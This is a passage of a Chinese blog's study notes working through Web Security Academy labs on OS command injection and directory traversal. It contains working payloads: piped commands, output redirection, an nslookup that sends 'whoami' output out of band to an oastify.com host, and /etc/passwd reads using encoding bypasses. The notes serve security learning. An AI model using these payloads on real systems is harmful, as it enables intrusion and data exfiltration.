class="headerlink" title="靶场"></a>靶场</h2><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308221632948.png"></p><p>提示：库存检查存在 有shell命令。直接抓包用 | whoami 查看当前用户名。在第一个参数后面添加执行发现没有效果，再次尝试storeID</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/2</span><br><span class="line">Host: 0a1900bd04154b2f80739f1600f400cc.web-security-academy.net</span><br><span class="line">Cookie: session=Zj3WLRX1i44USkjEo61SzwWlq1KDEX1v</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://0a1900bd04154b2f80739f1600f400cc.web-security-academy.net/product?productId=1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 28</span><br><span class="line">Origin: https://0a1900bd04154b2f80739f1600f400cc.web-security-academy.net</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Te: trailers</span><br><span class="line"></span><br><span class="line">productId=1&amp;storeId=1|whoami</span><br></pre></td></tr></table></figure><p>响应：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/2 200 OK</span><br><span class="line">Content-Type: text/plain; charset=utf-8</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Content-Length: 13</span><br><span class="line"></span><br><span class="line">peter-dtm76l</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="操作系统盲注入命令。"><a href="#操作系统盲注入命令。" class="headerlink" title="操作系统盲注入命令。"></a>操作系统盲注入命令。</h3><p>也许这个功能存在os命令注入但是，并不会像上面一样直接返回在响应里。只能借助一些其他手段。</p><p>例如：一个允许用户提交有关该网站的反馈的网站。用户输入他们的电子邮件地址和反馈消息。然后，服务器端应用程序会向站点管理员生成一封包含反馈的电子邮件。为此，它会向<code>mail</code>程序调用所提交的详细信息。例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mail -s &quot;This site is great&quot; -aFrom:peter@normal-user.net feedback@vulnerable-website.com</span><br></pre></td></tr></table></figure><p>命令的输出<code>mail</code>（如果有）不会在应用程序的响应中返回，因此使用有效<code>echo</code>负载不会有效。在这种情况下，您可以使用各种其他技术来检测和利用漏洞。</p><h4 id="使用时间延迟检测操作系统盲注入漏洞。"><a href="#使用时间延迟检测操作系统盲注入漏洞。" class="headerlink" title="使用时间延迟检测操作系统盲注入漏洞。"></a>使用时间延迟检测操作系统盲注入漏洞。</h4><p>可以使用ping 命令向服务器发送指定数量的数据包，列如你发送了十个数据包刚好响应时间也是十秒。说明了存在os注入漏洞。</p><p>ping -c 10 127.0.0.1（此命令将导致应用程序对其环回网络适配器执行 ping 操作 10 秒。）</p><p>靶场提示，反馈功能中存在os命令注入漏洞。抓反馈功能的提交数据包。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308221703493.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /feedback/submit HTTP/2</span><br><span class="line">Host: 0a8900cd04c41e2783f5618b0037007c.web-security-academy.net</span><br><span class="line">Cookie: session=S1ncxBNd2GtKULOiaUb8Fg4hJZ50Ds80</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 130</span><br><span class="line">Origin: https://0a8900cd04c41e2783f5618b0037007c.web-security-academy.net</span><br><span class="line">Referer: https://0a8900cd04c41e2783f5618b0037007c.web-security-academy.net/feedback</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Te: trailers</span><br><span class="line"></span><br><span class="line">csrf=0v7lNP4ubazJJKADatV8GznxgWXhtkkW&amp;name=dasf&amp;email=dfasfasf%40qq.com||ping+-c+10+127.0.0.1||&amp;subject=fgfg&amp;message=dfadfasdfasdf</span><br></pre></td></tr></table></figure><p>等待十秒提示恭喜通关。</p><h4 id="通过重定向输出来利用操作系统盲注入漏洞。"><a href="#通过重定向输出来利用操作系统盲注入漏洞。" class="headerlink" title="通过重定向输出来利用操作系统盲注入漏洞。"></a>通过重定向输出来利用操作系统盲注入漏洞。</h4><p>您可以将注入命令的输出重定向到 Web 根目录中的文件中，然后可以使用浏览器检索该文件。例如，如果应用程序从文件系统位置提供静态资源<code>/var/www/static</code>，则您可以提交以下输入：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp; whoami &gt; /var/www/static/whoami.txt &amp;</span><br></pre></td></tr></table></figure><p>该<code>&gt;</code>字符将命令的输出发送<code>whoami</code>到指定的文件。然后，您可以使用浏览器来<code>https://vulnerable-website.com/whoami.txt</code>获取文件，并查看注入命令的输出。</p><p>提示说还是在反馈功能中存在os注入命令。有一个可写文件夹，我们可以把whoami写到&#x2F;var&#x2F;www&#x2F;images&#x2F;下的文件。在把它读出来。（为什么在email中，可能是因为应用程序对于消息参数可能会进行更严格的验证和处理，从而减少了恶意代码的成功注入机会。但是，如果应用程序没有正确处理邮件参数，攻击者仍然可以尝试在这里执行注入。总之都可以试试）</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308221739288.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /feedback/submit HTTP/2</span><br><span class="line">Host: 0abe00e30440847e818117b200e20055.web-security-academy.net</span><br><span class="line">Cookie: session=zPuRLMniFyKx7WQpLGXAEw55UymWtTUZ</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 130</span><br><span class="line">Origin: https://0abe00e30440847e818117b200e20055.web-security-academy.net</span><br><span class="line">Referer: https://0abe00e30440847e818117b200e20055.web-security-academy.net/feedback</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Te: trailers</span><br><span class="line"></span><br><span class="line">csrf=QMoPRs0ZiFKaiOIsvgdT2riRIrUTDGwN&amp;name=fdfd&amp;email=dfasfasf%40qq.com||whoami&gt;/var/www/images/1.txt||&amp;subject=dfsf&amp;message=dfsdf</span><br></pre></td></tr></table></figure><p>读取（文件读取参数 filenmae)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /image?filename=1.txt HTTP/2</span><br><span class="line">Host: 0abe00e30440847e818117b200e20055.web-security-academy.net</span><br><span class="line">Cookie: session=zPuRLMniFyKx7WQpLGXAEw55UymWtTUZ</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</span><br><span class="line">Accept: image/avif,image/webp,*/*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://0abe00e30440847e818117b200e20055.web-security-academy.net/product?productId=1</span><br><span class="line">Sec-Fetch-Dest: image</span><br><span class="line">Sec-Fetch-Mode: no-cors</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Te: trailers</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>响应</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/2 200 OK</span><br><span class="line">Content-Type: text/plain; charset=utf-8</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Content-Length: 13</span><br><span class="line"></span><br><span class="line">peter-XO65eB</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="使用带外-OAST-技术来利用操作系统盲命令注入"><a href="#使用带外-OAST-技术来利用操作系统盲命令注入" class="headerlink" title="使用带外 (OAST) 技术来利用操作系统盲命令注入"></a>使用带外 (OAST) 技术来利用操作系统盲命令注入</h4><p>有时有漏洞却无法查看，这时候就可以借助OSTA技术，就是我们俗称的dnslog在burp 专业版自带。</p><p>本关的靶场使用nslookup（<strong>nslookup</strong>（意为name server lookup）是一个网络管理命令行界面工具，用户可以利用nslookup查询域名]的ip地址以及ip地址所对应的[域名，例如在命令行界面输入nslookup以及网址后，nslookup会发送命令给电脑所连接的域名服务器，随后便能得出网址所映射的IP地址） </p><p>我们用nslooup去查看域名dns解析记录，响应就会返回到dnslog上。</p><p>靶场提示还是在反馈功能中存在OS命令注入</p><p>  <img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308241720564.png"></p><p>发送请求，在email中添加dnslog 提供的域名用nslookup 去查看dns解析是否正常</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /feedback/submit HTTP/2</span><br><span class="line">Host: 0ab000a60393331c80f1ad87005000f1.web-security-academy.net</span><br><span class="line">Cookie: session=YdOaFwCj0gyFBWIckPqoahYOMBnabbea</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 147</span><br><span class="line">Origin: https://0ab000a60393331c80f1ad87005000f1.web-security-academy.net</span><br><span class="line">Referer: https://0ab000a60393331c80f1ad87005000f1.web-security-academy.net/feedback</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Te: trailers</span><br><span class="line"></span><br><span class="line">csrf=AgxYrQ96T7gUF8DOiRdhDLWFRp4K8JZQ&amp;name=sds&amp;email=afdgf%40qqq.com||nslookup+o3s5l1tqv1piz08ugqnh10tbk2qseh.oastify.com||&amp;subject=dfd&amp;message=dfa</span><br></pre></td></tr></table></figure><p>成功返回</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308241727339.png"></p><h4 id="带外数据泄露的盲操作系统命令注入"><a href="#带外数据泄露的盲操作系统命令注入" class="headerlink" title="带外数据泄露的盲操作系统命令注入"></a>带外数据泄露的盲操作系统命令注入</h4><p>靶场提示如上，用nslookup+<code>whoami</code>.域名。  <code>whoami</code> 应该被反引号 包裹起来，这意味着它会被执行并将结果插入到整个命令中。因此，当你运行这个命令时，首先会执行反引号内的 <code>whoami</code> 命令，然后将其结果与 **.**后面的域名 连接起来，最后传递给 <code>nslookup</code> 命令进行执行。最后返回系统用户。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /feedback/submit HTTP/2</span><br><span class="line">Host: 0a050043041c9eb2802a3578004300c7.web-security-academy.net</span><br><span class="line">Cookie: session=gLmJrmUmIIBZMTNSFWVaJyhH8t10HFv3</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 92</span><br><span class="line">Origin: https://0a050043041c9eb2802a3578004300c7.web-security-academy.net</span><br><span class="line">Referer: https://0a050043041c9eb2802a3578004300c7.web-security-academy.net/feedback</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Te: trailers</span><br><span class="line"></span><br><span class="line">csrf=Zo8hnQTakbpcrH1evkMfBeTOfZmwprEX&amp;name=dfa&amp;email=afdgf%40qqq.com||nslookup+`whoami`.ygizbth39q1cmis7oh149oxdy44usj.oastify.com||&amp;subject=adf&amp;message=afd</span><br></pre></td></tr></table></figure><p>如结果所示whoami命令被执行了，后面是域名。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308241810120.png"></p><p>提交即可。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> os命令注入漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>目录遍历相关靶场</title>
      <link href="/2023/08/16/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E7%9B%B8%E5%85%B3%E9%9D%B6%E5%9C%BA/"/>
      <url>/2023/08/16/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E7%9B%B8%E5%85%B3%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="#前言："></a>#前言：</h1><p>学的有点杂，记录一下还是比较好的</p><h2 id="什么是目录遍历"><a href="#什么是目录遍历" class="headerlink" title="什么是目录遍历?"></a>什么是目录遍历?</h2><p><strong>个人理解</strong>：攻击者可以访问未经授权的文件，对服务的目录进行操作。</p><p><strong>官方</strong>：目录遍历（也称为文件路径遍历）是一种 Web 安全漏洞，允许攻击者读取正在运行应用程序的服务器上的任意文件。这可能包括应用程序代码和数据、后端系统的凭据以及敏感的操作系统文件。在某些情况下，攻击者可能能够写入服务器上的任意文件，从而允许他们修改应用程序数据或行为，并最终完全控制服务器。</p><h2 id="通过目录遍历读取任意文件（我也懒的举例了，粘贴吧）"><a href="#通过目录遍历读取任意文件（我也懒的举例了，粘贴吧）" class="headerlink" title="通过目录遍历读取任意文件（我也懒的举例了，粘贴吧）"></a>通过目录遍历读取任意文件（我也懒的举例了，粘贴吧）</h2><p>考虑一个显示待售商品图像的购物应用程序。图像通过一些 HTML 加载，如下所示：</p><img src="/loadImage?filename=218.png"><p>URL<code>loadImage</code>接受一个<code>filename</code>参数并返回指定文件的内容。图像文件本身存储在磁盘上的位置<code>/var/www/images/</code>。为了返回图像，应用程序将请求的文件名附加到该基目录，并使用文件系统 API 读取文件的内容。在上述情况下，应用程序从以下文件路径读取：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/www/images/218.png</span><br></pre></td></tr></table></figure><p>该应用程序没有实现针对目录遍历攻击的防御，因此攻击者可以请求以下 URL 从服务器的文件系统检索任意文件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://insecure-website.com/loadImage?filename=../../../etc/passwd</span><br></pre></td></tr></table></figure><p>这会导致应用程序从以下文件路径读取：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/www/images/../../../etc/passwd</span><br></pre></td></tr></table></figure><p>该序列<code>../</code>在文件路径内有效，并且意味着在目录结构中向上一级。三个连续的<code>../</code>序列从文件系统根开始<code>/var/www/images/</code>，因此实际读取的文件是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd</span><br></pre></td></tr></table></figure><p>在基于 Unix 的操作系统上，这是一个标准文件，包含在服务器上注册的用户的详细信息。</p><p>在 Windows 上， 和<code>../</code>都是<code>..\</code>有效的目录遍历序列，检索标准操作系统文件的等效攻击是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini</span><br></pre></td></tr></table></figure><h2 id="到了靶场环节"><a href="#到了靶场环节" class="headerlink" title="到了靶场环节"></a>到了靶场环节</h2><p>根据提示，图像的加载存在目录遍历漏洞，然后去访问跟目录下&#x2F;ect&#x2F;passwd的文件</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308162127562.png"></p><p>在http记录中找到一个图像加载的数据包，修改filenmae 参数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /image?filename=../../../etc/passwd HTTP/2</span><br><span class="line">Host: 0a8c003503af990982e9511e0092006c.web-security-academy.net</span><br><span class="line">Cookie: session=XvVJPTUbK0kVF9PgJvwg0Uu5nlOUjUiV</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</span><br><span class="line">Accept: image/avif,image/webp,*/*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://0a8c003503af990982e9511e0092006c.web-security-academy.net/</span><br><span class="line">Sec-Fetch-Dest: image</span><br><span class="line">Sec-Fetch-Mode: no-cors</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Te: trailers</span><br></pre></td></tr></table></figure><p>发送得到响应</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/2 200 OK</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Content-Length: 2316</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">peter:x:12001:12001::/home/peter:/bin/bash</span><br><span class="line">carlos:x:12002:12002::/home/carlos:/bin/bash</span><br><span class="line">user:x:12000:12000::/home/user:/bin/bash</span><br><span class="line">elmer:x:12099:12099::/home/elmer:/bin/bash</span><br><span class="line">academy:x:10000:10000::/academy:/bin/bash</span><br><span class="line">messagebus:x:101:101::/nonexistent:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash</span><br><span class="line">usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin</span><br><span class="line">mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin</span><br><span class="line">avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin</span><br><span class="line">cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin</span><br><span class="line">geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin</span><br><span class="line">saned:x:114:122::/var/lib/saned:/usr/sbin/nologin</span><br><span class="line">colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin</span><br><span class="line">pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin</span><br><span class="line">gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="利用文件路径遍历漏洞的常见障碍"><a href="#利用文件路径遍历漏洞的常见障碍" class="headerlink" title="利用文件路径遍历漏洞的常见障碍"></a>利用文件路径遍历漏洞的常见障碍</h2><p>网站会对用户访问的网站文件进行防御。</p><h3 id="使用文件的绝对路径引用文件。"><a href="#使用文件的绝对路径引用文件。" class="headerlink" title="使用文件的绝对路径引用文件。"></a>使用文件的绝对路径引用文件。</h3><p> 通过构造绝对路径，攻击者可以绕过应用程序可能对相对路径的权限限制。这允许他们访问他们通常无权访问的文件或目录。（简单点就是 对相对路径进行了限制，可以使用绝对路径访问）</p><p>如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /image?filename=/etc/passwd HTTP/2</span><br><span class="line">Host: 0a0e0008037c9f5b818dca5800500068.web-security-academy.net</span><br><span class="line">Cookie: session=z3fhbKxqbDk1eJBJ8RqkVXIPj4Hzi1zl</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</span><br><span class="line">Accept: image/avif,image/webp,*/*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://0a0e0008037c9f5b818dca5800500068.web-security-academy.net/</span><br><span class="line">Sec-Fetch-Dest: image</span><br><span class="line">Sec-Fetch-Mode: no-cors</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Te: trailers</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>响应：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/2 200 OK</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Content-Length: 2316</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">peter:x:12001:12001::/home/peter:/bin/bash</span><br><span class="line">carlos:x:12002:12002::/home/carlos:/bin/bash</span><br><span class="line">user:x:12000:12000::/home/user:/bin/bash</span><br><span class="line">elmer:x:12099:12099::/home/elmer:/bin/bash</span><br><span class="line">academy:x:10000:10000::/academy:/bin/bash</span><br><span class="line">messagebus:x:101:101::/nonexistent:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash</span><br><span class="line">usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin</span><br><span class="line">mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin</span><br><span class="line">avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin</span><br><span class="line">cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin</span><br><span class="line">geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin</span><br><span class="line">saned:x:114:122::/var/lib/saned:/usr/sbin/nologin</span><br><span class="line">colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin</span><br><span class="line">pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin</span><br><span class="line">gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="文件路径遍历，非递归地剥离遍历序列"><a href="#文件路径遍历，非递归地剥离遍历序列" class="headerlink" title="文件路径遍历，非递归地剥离遍历序列"></a>文件路径遍历，非递归地剥离遍历序列</h3><p>网站只要发现了’..&#x2F;‘这样的路径就会进行去除，有点像waf遇到危险字符就进行拦截。这种方法用来确保应用程序只能访问正确的文件，而不会被欺骗访问其他地方。</p><p>靶场的提示还是和第一个一样。</p><p>这个绕过的方法使用**….&#x2F;&#x2F;….&#x2F;&#x2F;**个人感觉和文件上传的双写绕过有点类似，当网站发现了..&#x2F;进行剥离。经过处理还是..&#x2F; </p><p>..<strong>..&#x2F;</strong>&#x2F; ——-&gt;&gt; ..&#x2F;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /image?filename=....//....//....//etc/passwd HTTP/2</span><br><span class="line">Host: 0a74008704141924810cf9fb000000b0.web-security-academy.net</span><br><span class="line">Cookie: session=UnA2pIO4eC9xSppw8zwZT8BdDfDyM0CS</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</span><br><span class="line">Accept: image/avif,image/webp,*/*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://0a74008704141924810cf9fb000000b0.web-security-academy.net/</span><br><span class="line">Sec-Fetch-Dest: image</span><br><span class="line">Sec-Fetch-Mode: no-cors</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Te: trailers</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="通过多余的-URL-解码去除遍历序列"><a href="#通过多余的-URL-解码去除遍历序列" class="headerlink" title="通过多余的 URL 解码去除遍历序列"></a>通过多余的 URL 解码去除遍历序列</h3><p>在某些情况下，例如在 URL 路径或<code>filename</code>请求的参数中<code>multipart/form-data</code>，Web 服务器可能会在将输入传递给应用程序之前删除任何目录遍历序列。有时，您可以通过 URL 编码或什至对字符进行双重 URL 编码来绕过这种清理<code>../</code>，从而分别产生<code>%2e%2e%2f</code>或<code>%252e%252e%252f</code>。各种非标准编码，例如<code>..%c0%af</code>或<code>..%ef%bc%8f</code>，也可以达到目的。</p><p>绕过的方式是通过url两次编码的方式进行。</p><p>..%25%2f..%25%2f</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308162226386.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET 